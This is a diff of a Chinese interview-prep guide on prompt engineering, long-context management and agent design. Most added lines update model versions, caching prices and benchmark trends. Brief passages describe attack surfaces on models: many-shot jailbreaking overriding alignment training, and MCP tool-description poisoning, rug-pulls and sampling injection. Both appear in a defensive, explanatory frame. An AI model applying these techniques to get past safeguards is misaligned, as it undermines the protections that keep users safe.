 - *适用边界*：对算术、常识、符号推理等**多步任务**增益明显；对简单单步任务可能无效甚至有害（增加错误链传播的概率）。
-- *与原生推理模型的关系*：o3/o4-mini（2025 下半年已被并入 GPT-5）、DeepSeek-R1、Claude extended thinking、Gemini thinking 模式已把 CoT **内化为训练目标（Long CoT + RL）**，推理在模型内部完成。**代际提示（2026 视角）**：2025-08 起 OpenAI 将 o 系列与 GPT 系列合并为**统一推理模型 GPT-5**，以 `reasoning_effort` 统一控制思考深度；Claude Sonnet 4.5 / Opus 4.1、Gemini 3 同代均内置思考预算。举例仍停在 o3/o4-mini 会暴露知识停在 2025 上半年。对这类模型，官方（OpenAI reasoning best practices）建议**反而要简化 prompt**：不要手写 "think step by step"、不要塞 few-shot，直接描述目标和约束，用 `reasoning_effort`（及 `verbosity`）之类的参数控制思考预算。这是 2024–2025 的重要范式转移：**传统 CoT prompting 技巧在推理模型上多数已过时，甚至互相干扰**。
+- *与原生推理模型的关系*：o3/o4-mini（2025 下半年已被并入 GPT-5）、DeepSeek-R1、Claude extended thinking、Gemini thinking 模式已把 CoT **内化为训练目标（Long CoT + RL）**，推理在模型内部完成。**代际提示（2026 视角）**：2025-08 起 OpenAI 将 o 系列与 GPT 系列合并为**统一推理模型 GPT-5**，以 `reasoning_effort` 统一控制思考深度；Claude Opus 4.1（2025-08）、Sonnet 4.5（2025-09）到 Gemini 3（2025-11），2025 下半年相继发布的各家旗舰亦均内置思考预算。举例仍停在 o3/o4-mini 会暴露知识停在 2025 上半年。对这类模型，官方（OpenAI reasoning best practices）建议**反而要简化 prompt**：不要手写 "think step by step"、不要塞 few-shot，直接描述目标和约束，用 `reasoning_effort`（及 `verbosity`）之类的参数控制思考预算。这是 2024–2025 的重要范式转移：**传统 CoT prompting 技巧在推理模型上多数已过时，甚至互相干扰**。
 - *深层争议*：推理链的**忠实性（faithfulness）**问题——2024–2025 的多项研究（如 Anthropic 的 *Reasoning models don't always say what they think*）表明，显式推理链可能是事后合理化（post-hoc rationalization），与模型真实的计算过程不一致。面试中能说出这一点，体现文献深度。
 
 **Self-Consistency（Wang et al., 2022）**：CoT 默认用 greedy decoding，单一推理路径脆弱。Self-Consistency 用**较高温度采样多条不同的推理链**，对**最终答案**做多数表决（majority voting）。
@@ -1015,7 +1098,7 @@ Prompt Engineering 与上下文工程
 
 #### 2.6 上下文窗口管理：长程 Agent 的三大技术
 
-Agent 跑几十上百步后，上下文必然撞墙（主流旗舰模型普遍 128K–200K tokens；Claude Sonnet 4、GPT-4.1、Gemini 2.5 等在 2025 年提供了 1M 级窗口，但长窗口不等于好用，见 2.7；LangChain 提到常见在 95% 处触发自动 compaction）。三件套：
+Agent 跑几十上百步后，上下文必然撞墙（128K–200K tokens 是 2024–2025 上半年的主流格局；截至 2026 年，GPT-5 系为 400K，Gemini 2.5/3 与 Claude Sonnet 4.5 已达 1M 级窗口，但长窗口不等于好用，见 2.7；LangChain 提到常见在 95% 处触发自动 compaction）。三件套：
 
 **① Compaction（压缩重启）**：对话接近上限时，生成一份保留"关键决策、已确认事实、未决问题"的摘要，**用摘要替换原始历史并重启会话**。Anthropic 披露 Claude Code 的做法：压缩历史 + **最近访问的 5 个文件**继续（官方原文仅说 the five most recently accessed files，未承诺保留完整原文）。最安全的第一步压缩是"清空旧的 tool result，只留调用记录与结论"。
 
@@ -1024,6 +1107,12 @@ Agent 跑几十上百步后，上下文必然撞墙（主流旗舰模型普遍 1
 **③ Sub-agent（子代理隔离）**：把高 token 消耗的子任务（深度检索、代码库勘察）交给独立上下文的子 Agent，子 Agent 只回传 **1,000–2,000 token 的浓缩摘要**，主 Agent 做综合。本质是**用进程隔离换上下文隔离**，主线程的注意力预算不被搜索噪声污染。代价：LangChain 指出多 Agent 架构整体 token 消耗可达单 Agent 的 **15 倍**——隔离省的是*主上下文*，不是*总成本*，别混淆这两个口径。
 
 **API 级产品化（2025）**：Anthropic 把上述技术沉淀为官方原语——**context editing** 在接近阈值时自动清理过期的 tool-use 结果（compaction 的托管版）；**memory tool** 让 Agent 跨上下文读写客户端记忆目录（notes 的托管版）；**interleaved thinking** 允许模型在工具调用之间思考，提升长轨迹的推理质量。这标志着三件套从"各家自制"走向"平台默认能力"，系统设计题里提一句"能用平台原语就不自研"体现工程判断。
+
+#### 多轮对话性能衰减：Lost in Multi-Turn（2025）
+
+**《LLMs Get Lost in Multi-Turn Conversation》（Laban et al., 微软/Salesforce, arXiv:2505.06120）**给"Agent 聊着聊着就变傻"提供了定量证据：把同一任务的信息**分片成多轮逐步给出**，与**单轮一次性给全**对比——15 个主流模型在六类生成任务上**平均性能下降约 39%**，开源闭源无一幸免。
+- **机理**：①模型在信息不全时**过早尝试给出完整解**，并**锚定自己早期的错误假设**，后续轮次难以纠偏——错误不是被修正而是被反复引用；②按论文的分解指标，**aptitude（最好情况能力）仅小幅下降，unreliability（同题多次运行的方差）暴涨才是主因**——"变笨"是次要的，"变得不可靠"才是主要的；③降温度救不了：论文实测低温度下多轮方差依旧居高。
+- **工程启示**：①关键任务做**单轮重述（consolidation）**——把多轮收集到的需求合并成一条完整指令重新发起，收益立竿见影；②长对话 Agent 跑偏时，**重启会话并携带浓缩状态**（即上文 compaction + structured notes 的组合）优于在原对话里原地修补——补丁修不掉早期错误锚定；③这与 context rot 是**两个独立机制**：前者源于错误锚定与方差爆炸，后者源于注意力稀释，面试中分开表述体现精确性。
 
 #### 2.7 长上下文的陷阱与压缩技术
 
@@ -1034,7 +1123,24 @@ Agent 跑几十上百步后，上下文必然撞墙（主流旗舰模型普遍 1
 - *Token/Prompt 级*：**LLMLingua**（用小语言模型的 perplexity 信号删除低信息量 token，宣称可达约 20× 压缩且损失极小）；**LongLLMLingua** 专门针对长上下文，引入 question-aware 压缩与文档重排序来对抗 lost-in-the-middle。
 - *KV Cache 级*：长上下文的真正瓶颈常在显存——长序列场景下 KV cache 可占 GPU 显存的 **70%** 以上。代表工作：**H2O（Heavy-Hitter Oracle）** 保留累计注意力高的"重击"token；**StreamingLLM** 发现并保留 **attention sink**（句首几个 token 承载大量注意力质量，丢弃即崩溃），实现"无限"流式推理；以及 KV 量化、ChunkKV（2025，按语义 chunk 粒度驱逐）、Locret（训练辅助 retaining head 预测保留位）等。
 - *表征层成因（深度加分）*：名义上的超长上下文多靠**位置编码外推**达成——RoPE 及其缩放方案（YaRN、NTK-aware scaling）把基础频率拉伸以覆盖更长序列，但模型的**训练长度分布集中在远短于名义上限的序列**上。位置编码可以外推、训练分布补不上，这为 context rot 提供了机制层解释：有效检索能力随长度退化，本质是训练-推理长度错配的结果。
-- *工程侧平替*：**Prompt Caching**——应用层最划算的"压缩"。Anthropic 提供显式缓存（最多 4 个 `cache_control` 断点、最小可缓存前缀 ≥1024 tokens（Sonnet/Opus 级）/ 2048 tokens（Haiku 级））：缓存命中后输入成本约为原价的 **1/10**，写入缓存约 1.25×（5 分钟 TTL）/ 2×（1 小时 TTL）；OpenAI 为自动缓存、命中约 5 折、无需配置。稳定的 system + tools 前缀应当永远缓存，TTFT 与账单同步下降。面试谈成本优化必提。
+- *工程侧平替*：**Prompt Caching**——应用层最划算的"压缩"。Anthropic 提供显式缓存（最多 4 个 `cache_control` 断点、最小可缓存前缀 ≥1024 tokens（Sonnet/Opus 级）/ 2048 tokens（Haiku 级））：缓存命中后输入成本约为原价的 **1/10**，写入缓存约 1.25×（5 分钟 TTL）/ 2×（1 小时 TTL）；OpenAI 为自动缓存、无需配置，命中折扣按代际区分：4o 代约 5 折、GPT-4.1 代 75% 折扣、GPT-5 代约 9 折（缓存输入 $0.125 vs $1.25/MTok）——"缓存一律 5 折"是 2024 年 gpt-4o 口径的过时说法。稳定的 system + tools 前缀应当永远缓存，TTFT 与账单同步下降。面试谈成本优化必提。
+
+#### 上下文失效四模式：可引用的命名体系（Breunig, 2025）
+
+Drew Breunig《How Long Contexts Fail》（2025-06）把长上下文的失效方式归纳为四个可点名的模式，面试中能替代含糊的"上下文太长效果会变差"：
+- **Context Poisoning（中毒）**：幻觉或错误信息一旦进入上下文，就被后续轮次**反复引用并自我强化**——Gemini 玩 Pokémon 的技术报告是著名案例：目标栏被污染后，Agent 持续追逐不可能达成的目标。
+- **Context Distraction（分心）**：历史过长时模型**过度依赖上下文中的既有内容、放弃调用参数化知识**——表现为倾向重复历史动作而非推理新方案。
+- **Context Confusion（混淆）**：无关内容也会被模型"认真对待"从而干扰决策——几十个用不上的工具定义拖垮工具选择准确率即此模式。
+- **Context Clash（冲突）**：上下文内部信息互相矛盾（早期错误假设 vs 新到证据），模型无法可靠仲裁——与 2.6"多轮对话性能衰减"的错误锚定机理同源。
+
+对应缓解各有其名：**quarantine（隔离：sub-agent 独立上下文）、pruning（修剪无关内容）、summarization（摘要压缩）、offloading（卸载到外部笔记/工具）**——正是 2.6 三件套与 LangChain 四支柱的另一套投影。本章散见的 context rot、lost-in-the-middle 属于衰减的**度量与机理**，四模式是**症状级分类学**；两套词汇对照使用，最能体现体系感。
+
+#### Many-shot ICL：长上下文的正向利用
+
+长上下文不只有陷阱。**Agarwal et al.《Many-Shot In-Context Learning》（DeepMind, NeurIPS 2024）**系统验证：把示例数从 few-shot 的个位数扩展到**数百至数千个**（可占数十万 token），在翻译、摘要、规划、代码等任务上**性能随示例数持续提升**，部分场景**逼近微调效果**，并能一定程度覆盖预训练偏差（如低资源语言）。
+- **Reinforced ICL**：人写示例供不起怎么办——让模型自己生成推理链、按最终答案正确性筛选后当示例用，效果可比人写示范，缓解 many-shot 的数据瓶颈。
+- **工程组合**：数千示例是一段**巨大但完全稳定的前缀**，与 prompt caching 天然互补——一次写入缓存、后续按命中折扣计费（见上文），使 many-shot 从"贵得离谱"变成"可负担的轻量替代微调"。
+- **注意区分**：2.8 的 many-shot jailbreaking 是同一机制的攻击面——大量示例既能压过预训练偏差，也能压过对齐训练。此处是能力面；面试中把两面说通，体现对 ICL 机制的完整理解。
 
 #### 2.8 提示词注入（Prompt Injection）与防御
 
@@ -1064,6 +1170,7 @@ Agent 跑几十上百步后，上下文必然撞墙（主流旗舰模型普遍 1
 - **OPRO（Yang et al., DeepMind, 2023）**：把"历史 prompt + 得分"喂回 LLM，让它作为优化器提出更优 prompt，迭代搜索。
 - **Metaprompting / 控制台工具**：Anthropic Console 的 Generate a Prompt、OpenAI Playground 的生成/优化按钮，是上述思想的平民化产品。
 - **DSPy（Stanford, Khattab et al.）**：代表性框架。用**签名（signature）**声明任务、用模块（ChainOfThought、ReAct 等）搭流水线，把指令措辞与 few-shot 示例的选择交给**优化器（BootstrapFewShot、MIPROv2 等）**在训练集 + 指标上自动搜索——这一步称为**编译（compile）**。类比：你写 SQL，优化器生成执行计划。
+- **GEPA（Agrawal et al., UC Berkeley/Stanford/Databricks 等, 2025）**：反思式进化 prompt 优化，谱系的最新一代。机制两件套：①**自然语言反思**——让 LLM 阅读失败轨迹（含推理过程与报错信息），用语言诊断"为什么错"并据此改写 prompt，比只回传标量分数的 OPRO 式优化信息利用率高得多；②**Pareto 前沿维护**——不只保留全局最优，而是保留"在任一子任务上最优"的候选集合参与进化，避免过早收敛。论文声称在**显著更少 rollout（约 35× 样本效率量级）下超过 MIPROv2 与 GRPO 类 RL 路线**。其定位是 2025 年的新叙事：**prompt 优化可作为权重 RL 的低成本替代**——把"改提示"与"改权重"放进同一张性价比坐标系比较，面试中能点出这层定位即是加分。
 - **价值与边界**：优势是 prompt 随模型换代可重新编译、pipeline 各阶段联合优化、消除手工玄学；前提是**高质量的 eval 集与自动指标**（含 LLM-as-judge），代价是优化本身消耗大量调用、结果可能过拟合 dev 集、编译产物不透明且换模型必须重编译。
 - **面试信号**：能区分"prompt 工匠"（靠手感试错）与"prompt 工程"（eval 驱动 + 自动优化），是中高级候选人的分水岭。
 
@@ -1112,12 +1219,14 @@ Agent 跑几十上百步后，上下文必然撞墙（主流旗舰模型普遍 1
 | System/User 角色分工与 system prompt 设计原则 | ⭐⭐ | 偏工程实操；知道 developer 角色更名加分 |
 | ToT / ReAct / Reflexion 对比及"模板过时、循环保留" | ⭐⭐ | 通常作为 CoT 追问，Agent 岗必问 |
 | 采样参数（temperature / top-p / penalty / stop）与确定性迷思 | ⭐⭐ | 基础但暴露功底：temperature 0 ≠ 可复现；penalty 抑重复、stop 控边界；结构合法性不靠调温 |
-| Prompt 自动优化（DSPy / OPRO）与 eval-driven | ⭐⭐ | 区分"手工匠人"与"工程学派" |
+| Prompt 自动优化（DSPy / OPRO / GEPA）与 eval-driven | ⭐⭐ | 区分"手工匠人"与"工程学派"；GEPA 代表"prompt 优化替代权重 RL"新叙事 |
 | KV cache / Prompt Caching 的成本视角 | ⭐⭐ | 区分"会写 prompt"与"会做系统"的分水岭 |
 | 模型代际（GPT-5 统一推理模型 / Sonnet 4.5 / Gemini 3） | ⭐⭐ | 举例停在 o3/o4-mini 会被判定知识陈旧；reasoning_effort 统一控制思考深度 |
 | MCP 的安全面（工具描述投毒 / rug-pull / sampling 注入） | ⭐⭐ | 2025–2026 新增高频；与注入防御框架天然衔接 |
 | 多模态 / VLM prompting | ⭐⭐ | 图像 token 预算、图文排布（指令置于图像后）、多图交错、文档理解 |
 | 长期记忆系统生态（MemGPT/Letta、Mem0、Zep） | ⭐⭐ | "长期记忆怎么落地"的标准答案；检索-注入 + 写回更新模式 |
+| 多轮对话衰减与上下文失效四模式 | ⭐⭐ | Lost in Multi-Turn 平均掉约 39%、unreliability 是主因；poisoning/distraction/confusion/clash 可引用命名 |
+| Many-shot ICL（长上下文能力面） | ⭐ | 数百至数千示例持续增益、逼近微调，配 prompt caching；与 many-shot jailbreaking 一体两面 |
 | 推理链忠实性（faithfulness）争议 | ⭐ | 开放题加分项 |
 
 ---
@@ -1149,7 +1258,7 @@ Agent 跑几十上百步后，上下文必然撞墙（主流旗舰模型普遍 1
 **参考答案要点**：
 - 机制：自回归模型把已生成 token 当作工作记忆；CoT 把多步计算外显为中间 token，使每步只做局部推理，并让问题落入预训练中见过的推理文本分布；同时错误可以在步骤层面被（人类或验证器）定位。
 - 边界：对单步/检索型任务无效甚至有害；长链有错误传播；推理链可能不忠实（post-hoc rationalization）。
-- 范式转移：o3/o4-mini（已被并入 GPT-5）、R1、Claude extended thinking、Gemini thinking 用 Long CoT + RL 把搜索式思考内化进训练，推理发生在内部；2025-08 起 GPT-5 以**统一模型 + `reasoning_effort`** 成为 OpenAI 侧默认形态，Claude Sonnet 4.5 / Opus 4.1、Gemini 3 同代内置思考预算。OpenAI 官方明确建议对推理模型**简化 prompt**：直接给目标与约束，不要手写 CoT 触发词、不要 few-shot 推理示范，用 reasoning effort/budget 参数控制深度。传统 CoT prompting 技巧在这一代模型上多数过时甚至干扰。
+- 范式转移：o3/o4-mini（已被并入 GPT-5）、R1、Claude extended thinking、Gemini thinking 用 Long CoT + RL 把搜索式思考内化进训练，推理发生在内部；2025-08 起 GPT-5 以**统一模型 + `reasoning_effort`** 成为 OpenAI 侧默认形态，Claude Opus 4.1（2025-08）、Sonnet 4.5（2025-09）与稍晚的 Gemini 3（2025-11）相继内置思考预算。OpenAI 官方明确建议对推理模型**简化 prompt**：直接给目标与约束，不要手写 CoT 触发词、不要 few-shot 推理示范，用 reasoning effort/budget 参数控制深度。传统 CoT prompting 技巧在这一代模型上多数过时甚至干扰。
 - 加分：Self-Consistency 与 ToT 的思想（多路径边际化、搜索+评估）其实被吸收进了训练期的搜索式 RL（如 MCTS 式训练），所以应用层不再需要手工做。
 
 #### 题 4（进阶）：Self-Consistency 为什么能提升准确率？它的适用前提和代价是什么？
@@ -1272,7 +1381,7 @@ Agent 跑几十上百步后，上下文必然撞墙（主流旗舰模型普遍 1
 - 为什么缓存是主矛盾：长程 Agent 每轮都要为"全部历史"重新 prefill，未缓存时输入成本与 TTFT 随轨迹长度线性增长。Manus 的判断（Harness 综述引用）：**KV-cache 命中率是生产级 AI agent 最重要的单一指标**——Sonnet 缓存命中约 $0.30/MTok、未缓存约 $3.00/MTok，差一个数量级；命中率是同时决定账单与首 token 延迟的变量。
 - 三条结构规则（综述 C 层生产细则）：①**前缀稳定**——system prompt + 工具定义固定在上下文最前，顺序与措辞不随意改动；②**append-only**——新信息只追加到末尾（用户轮次、工具返回、assistant 输出天然 append-only），不在中段插入或改写；compaction 用"摘要重启"显式重建一段新的稳定前缀，而不是在历史中段动手术；③**确定性序列化**——同一内容每轮序列化逐字节一致：JSON 字段顺序固定、前缀中不掺入时间戳/随机 ID，否则缓存键漂移、命中率无声崩塌。
 - 最易破坏缓存的细节（加分）：工具可用性随状态变化时，**用掩码 logits 在解码层屏蔽不可用工具，而不是运行时增删工具列表**（Manus 做法）——改工具列表即改前缀，整段缓存作废；动态检索内容追加在尾部，不插入 system 段；多 Agent 场景共享同一份稳定前缀模板，最大化跨轮次、跨会话复用。
-- API 落地：Anthropic 显式缓存最多 4 个 `cache_control` 断点（最小可缓存前缀 Sonnet/Opus 级 ≥1024 tokens、Haiku 级 2048 tokens；TTL 5 分钟/1 小时），命中约原价 1/10、写入 1.25×–2×；OpenAI 自动缓存、命中约 5 折、无需配置。断点打在"稳定性边界"上：system 之后、tools 之后、few-shot 之后、长文档之后。
+- API 落地：Anthropic 显式缓存最多 4 个 `cache_control` 断点（最小可缓存前缀 Sonnet/Opus 级 ≥1024 tokens、Haiku 级 2048 tokens；TTL 5 分钟/1 小时），命中约原价 1/10、写入 1.25×–2×；OpenAI 自动缓存、无需配置，折扣随代际加深（4o 代约 5 折 → GPT-4.1 代 75% 折扣 → GPT-5 代约 9 折，缓存输入 $0.125 vs $1.25/MTok）。断点打在"稳定性边界"上：system 之后、tools 之后、few-shot 之后、长文档之后。
 - 与可观测性闭环：把命中率纳入指标体系（综述的推理/运维工程清单明确要求为延迟/token/错误/成本建可观测性）；compaction 策略或 prompt 改版时按"系统变更"对待，回归验证命中率与任务成功率——harness 各层耦合，局部"清理"可能正在悄悄击穿缓存。
 - 一句话收束：稳定前缀钉死、动态尾部追加、序列化字节对齐、工具掩码而非移除、命中率当一等指标。
 
@@ -1302,6 +1411,7 @@ Agent 跑几十上百步后，上下文必然撞墙（主流旗舰模型普遍 1
 20. **MCP 只谈红利、不谈安全**。工具描述本身是进入上下文的不可信文本（投毒 CVE-2025-54136），server 定义可被 rug-pull，sampling 可被反向利用；第三方 MCP server 要按供应链风险管理。
 21. **运行时增删工具会击穿前缀缓存**。"状态变了就把不可用工具从工具列表里拿掉"这一直觉会修改 prompt 前缀，使整段 KV cache 失效——按 Manus 的口径（缓存命中约 $0.30/MTok vs 未缓存约 $3.00/MTok，差一个数量级），这等于直接扔掉了生产级 agent 最重要的单一指标（KV-cache 命中率）。正确做法是工具列表保持稳定、**用掩码 logits 在解码层屏蔽不可用工具**：模型可见的工具集不变、前缀不变、缓存不丢。同源原则：任何"动态改前缀"的操作（中途插入 system 补丁、重排工具顺序）都是缓存杀手，动态内容只许 append 到末尾。
 22. **在 system prompt 里预先穷举边缘情况，只带来膨胀、不带来可靠性**。if-else 分支越多 prompt 越脆（边界上互相冲突），且指令块本身占用注意力预算；未经实证验证的边缘指令往往从未被真正触发过。生产做法相反：**先用最小 prompt 配最好的模型，从 eval/线上 trace 观察真实失败模式，再逐条补指令**——每条指令都应有"事故出处"。"预先穷举"是把 prompt 当规格说明书而非可优化制品的典型症状（呼应第 16 条）。
+23. **Agent 多轮跑偏时，原地修补不如重启携带浓缩状态**。《LLMs Get Lost in Multi-Turn Conversation》（arXiv:2505.06120）显示同一任务分片多轮平均比单轮合并低约 39%，且 aptitude 降幅小、unreliability（运行间方差）暴涨才是主因——早期错误被锚定后，后续轮次打补丁修不回来。生产对策：关键任务做单轮重述（consolidation）；长对话跑偏就 compaction 后重启并携带浓缩状态（见 2.6）。
 
 ---
 
@@ -1412,12 +1522,12 @@ Agent 核心架构与推理范式
 │
 ├── 8. 多智能体系统
 │   ├── Supervisor/Orchestrator vs 去中心化 Handoff
-│   └── 可并行 + 上下文独立才值得；token 成本约高一个量级（研究型任务的输入 token 口径 ~15×）
+│   └── 可并行 + 上下文独立才值得；token 成本双层口径：单 agent ≈ chat ~4×、多智能体 ≈ chat ~15×（≈ 单 agent ~4×）
 │
 ├── 9. 评测与基准
 │   ├── 两层：结果评测（成功率、pass@k 与 pass^k）+ 轨迹评测（逐步合理性）
 │   ├── SWE-bench(-Verified) / GAIA / τ-bench / τ²-bench / WebArena / OSWorld；LLM-as-judge 的局限
-│   ├── 能力坐标：METR（2025）50% 可靠完成的任务时长约每 7 个月翻倍
+│   ├── 能力坐标：METR（2025）50% 可靠完成的任务时长约每 7 个月翻倍（2024–2025 前沿子集已加速至约 4 个月）
 │   └── 基准污染与活基准；可观测性（LangSmith/Langfuse、OTel GenAI 语义约定）
 │
 ├── 10. 工程取舍（贯穿所有面试题）
@@ -1468,7 +1578,7 @@ Agent 核心架构与推理范式
 
 ReAct 的 synergy 在于：**Thought 帮助模型决定"做什么、为什么"**（规划、追踪进度、注入领域知识），**Action 帮助模型"接触现实"**（检索事实、获得反馈），二者交错使推理被 grounding 持续校准。论文在 HotpotQA、FEVER 上显示 ReAct 能纠正 CoT 的事实性错误，同时在 ALFWorld/WebShop 上比纯 acting 更鲁棒。
 
-**怎么用。** 现代框架（LangChain `create_react_agent`、多数 Agent SDK）默认就是 ReAct 变体。注意两个 2024+ 的能力升级：在支持 **原生 parallel tool calling** 的模型上，一个 step 可并发多个 Action；在支持 **interleaved thinking**（如 Claude extended thinking）的模型上，Thought 可以发生在任意两次工具调用之间，规划更深。
+**怎么用。** 现代框架（LangChain `create_react_agent`、多数 Agent SDK）默认就是 ReAct 变体（注：LangChain 1.0（2025-10）起标准入口已收敛为基于 LangGraph 的 `create_agent`，`create_react_agent` 属 legacy 命名，机制不变）。注意两个 2024+ 的能力升级：在支持 **原生 parallel tool calling** 的模型上，一个 step 可并发多个 Action；在支持 **interleaved thinking**（如 Claude extended thinking）的模型上，Thought 可以发生在任意两次工具调用之间，规划更深。
 
 **可默写的循环骨架（设计面试常要求手写控制流）：**
 
@@ -1508,7 +1618,7 @@ def react_loop(task, tools, llm, max_steps=25):
 | 长任务表现 | 易在长程中"忘记目标"/漂移 | 全局视野更好，目标对齐更稳 |
 | 对环境的适应 | 实时，天然适应观测 | 依赖 Replan，计划可能过时 |
 | 失败模式 | error compounding | 计划基于错误假设 → 整段跑偏 |
-| 典型实现 | LangChain create_react_agent | LangGraph plan-and-execute 教程 |
+| 典型实现 | LangChain create_react_agent（1.0 起标准入口为 create_agent） | LangGraph plan-and-execute 教程 |
 
 **关键工程点：Replan 的必要性。** 一次性计划几乎必然与现实不符（工具失败、返回意外数据）。没有 Replan 的 Plan-and-Execute 是脆弱的。Replanner 要回答：① 当前计划是否仍有效？② 需要增删改哪些步骤？③ 是否已可收尾？这本质上是一个**带状态的反思节点**。
 
@@ -1735,7 +1845,7 @@ def react_loop(task, tools, llm, max_steps=25):
 
 #### 2.14 多智能体系统（简述）
 
-**何时该上多智能体。** 单个 Agent 的上下文窗口与注意力有限；当任务**可并行且子任务上下文相互独立**（多源调研、大型代码库多模块修改）时，Orchestrator-Workers 多智能体同时拿到**上下文隔离**与**并行加速**。但要有成本意识：Anthropic 多代理研究系统的实测是 **token 消耗约为单 Agent 的 15 倍**（研究型任务的**输入 token** 口径）——只对可并行的高价值任务划算。
+**何时该上多智能体。** 单个 Agent 的上下文窗口与注意力有限；当任务**可并行且子任务上下文相互独立**（多源调研、大型代码库多模块修改）时，Orchestrator-Workers 多智能体同时拿到**上下文隔离**与**并行加速**。但要有成本意识：Anthropic 多代理研究系统的实测口径是双层的——**单 Agent ≈ 普通 chat 的 ~4 倍、多智能体系统 ≈ chat 的 ~15 倍**（即多智能体约为单 Agent 的 ~4 倍；研究型任务的**输入 token** 口径）——只对可并行的高价值任务划算。
 
 **两种主流编排。**
 - **Supervisor / Orchestrator**：中心 Agent 负责分解、分派、聚合（LangGraph supervisor、Claude Code subagent 模式）。
@@ -1753,7 +1863,7 @@ def react_loop(task, tools, llm, max_steps=25):
 
 **pass@k vs pass^k（可靠性的量化落点）。** pass@k 衡量"k 次里至少成功一次"，pass^k 衡量"k 次全部成功"——前者刻画能力上限，后者刻画**策略稳定性**，两者差距才是生产可用性的真实距离：一个 pass@1 约六成、看起来"还行"的系统，pass^8 可能已跌到约 25%（τ-bench 口径，相对降幅约 60%）。对外汇报 Agent 能力时应同时给出两者，否则会对生产可用性过度乐观。
 
-**能力坐标（时效）。** METR 的长任务研究（2025，arXiv 2503.14499）测得：AI 能**以 50% 可靠性完成的任务时长约每 7 个月翻倍**。回答"Agent 现在到什么水平"时，这是比单个榜单分数更有说服力的量化坐标，也解释了为什么长程一致性（而非单步能力）是当前瓶颈。
+**能力坐标（时效）。** METR 的长任务研究（2025，arXiv 2503.14499）测得：AI 能**以 50% 可靠性完成的任务时长约每 7 个月翻倍**；METR 的后续更新进一步指出，**2024–2025 的前沿模型子集翻倍期已缩短至约 4 个月**——引用这条趋势时应带上加速口径。回答"Agent 现在到什么水平"时，这是比单个榜单分数更有说服力的量化坐标，也解释了为什么长程一致性（而非单步能力）是当前瓶颈。
 
 **方法与陷阱。**
 - 从**真实失败轨迹**沉淀回归评测集，prompt/工具任何改动都跑回归。
@@ -1827,9 +1937,9 @@ def react_loop(task, tools, llm, max_steps=25):
 | 上下文工程 / 长程上下文管理 | ⭐⭐ | context rot；compaction；子代理隔离；prompt caching；记忆谱系（Letta/Zep/Mem0） |
 | 工具设计、MCP 与行动空间 | ⭐⭐ | MCP 规范演进与安全风险；工具规模问题（progressive disclosure）；受限解码机制；CodeAct |
 | "LLM 不能自纠" 的反直觉结论 | ⭐⭐ | 外部反馈/ground truth 是可靠性之源（体现深度） |
-| 多智能体编排 | ⭐⭐ | 可并行 + 上下文独立才值得；~15× token 成本（输入口径）；supervisor vs handoff |
+| 多智能体编排 | ⭐⭐ | 可并行 + 上下文独立才值得；token 成本双层口径（单 agent ≈ chat ~4×、多智能体 ≈ chat ~15×）；supervisor vs handoff |
 | HITL 模式与生产韧性 | ⭐⭐ | approval/steering/escalation 三模式；不可逆性 × 影响面；幂等/熔断/回滚/event sourcing |
-| 可靠性度量与能力趋势 | ⭐⭐ | pass@k vs pass^k 刻画策略稳定性；METR"7 个月翻倍"坐标；基准污染与活基准 |
+| 可靠性度量与能力趋势 | ⭐⭐ | pass@k vs pass^k 刻画策略稳定性；METR"7 个月翻倍、前沿子集已加速至约 4 个月"坐标；基准污染与活基准 |
 | 单步 vs 多步、如何控制 Agent 成本 | ⭐ | 降级策略、max iterations、缓存、模型分级 |
 | 如何评测 Agent | ⭐ | 结果+轨迹两层；回归集；SWE-bench(-Verified)/GAIA/τ-bench/τ²-bench；LLM-judge 局限 |
 
@@ -1989,7 +2099,7 @@ def react_loop(task, tools, llm, max_steps=25):
 
 **参考答案要点。**
 - **架构**：Orchestrator（主代理）解析问题 → 产出调研计划 → 分派 3–5 个并行 researcher 子代理（各管一个子问题、独立上下文）→ 子代理返回结构化摘要 + 来源链接 → 主代理交叉核对并撰写报告；尾部可加 citation checker / evaluator 节点。
-- **为什么多智能体**：每个子问题的浏览/检索上下文巨大且相互独立 → 上下文隔离 + 并行提速，单代理必然撑爆窗口。成本清醒：token 消耗约为单代理的 15 倍（Anthropic 实测，研究型任务的输入 token 口径），只对高价值任务划算。
+- **为什么多智能体**：每个子问题的浏览/检索上下文巨大且相互独立 → 上下文隔离 + 并行提速，单代理必然撑爆窗口。成本清醒：Anthropic 实测的双层口径是单代理 ≈ chat 的 ~4 倍、多智能体系统 ≈ chat 的 ~15 倍（即约为单代理的 ~4 倍；研究型任务的输入 token 口径），只对高价值任务划算。
 - **通信协议**：任务简报必须精确（目标、范围、返回格式、来源要求）；子代理内部是 ReAct（搜索→浏览→推理）；只回传"压缩证据 + 链接"，不回传原始网页——**网页内容是不可信数据**，需按 2.16 的间接注入防线处理（spotlighting、出网管控）。
 - **质量与可靠性**：每条论断必须有可点击来源；跨源冲突显式标注；以**工具返回内容**为唯一事实源防幻觉；LLM-judge + 人工抽检。
 - **工程**：模型分级（浏览抽取用小模型、综合用大模型）、prompt caching、每子代理超时与预算上限、Checkpointer 断点重试、全程轨迹日志支撑回归评测。
@@ -2002,7 +2112,7 @@ def react_loop(task, tools, llm, max_steps=25):
 
 **参考答案要点。**
 - 两层：① **结果评测**（success rate / pass@k，以及刻画策略可靠性的 **pass^k**——k 次全对的比例）回答"成不成、稳不稳"；② **轨迹评测**（逐步工具选择/参数合理性、冗余度）回答"为什么不成、怎么优化"，后者对迭代更具可操作性。
-- 代表基准：**SWE-bench(-Verified)**（真实仓库 issue 修复；Verified 是经人工去污染核查的版本）、**GAIA**（通用助手多步工具使用）、**τ-bench / τ²-bench**（工具调用 + 政策合规，pass^k 即出自此）、**WebArena / OSWorld**（GUI 操作）、**AgentBench**（多环境）；能力趋势可引 METR（2025）"50% 可靠完成的任务时长约每 7 个月翻倍"作为坐标。
+- 代表基准：**SWE-bench(-Verified)**（真实仓库 issue 修复；Verified 是经人工去污染核查的版本）、**GAIA**（通用助手多步工具使用）、**τ-bench / τ²-bench**（工具调用 + 政策合规，pass^k 即出自此）、**WebArena / OSWorld**（GUI 操作）、**AgentBench**（多环境）；能力趋势可引 METR（2025）"50% 可靠完成的任务时长约每 7 个月翻倍"作为坐标（其后续更新：2024–2025 前沿子集已加速至约 4 个月，引用时带上加速口径）。
 - 工程实践：从真实失败轨迹沉淀**回归集**，任何 prompt/工具改动都跑回归；A/B 灰度；成功率之外同时跟踪平均步数、token 成本、人工干预率、失败分类分布；trace 走 LangSmith/Langfuse + OTel GenAI 语义约定。
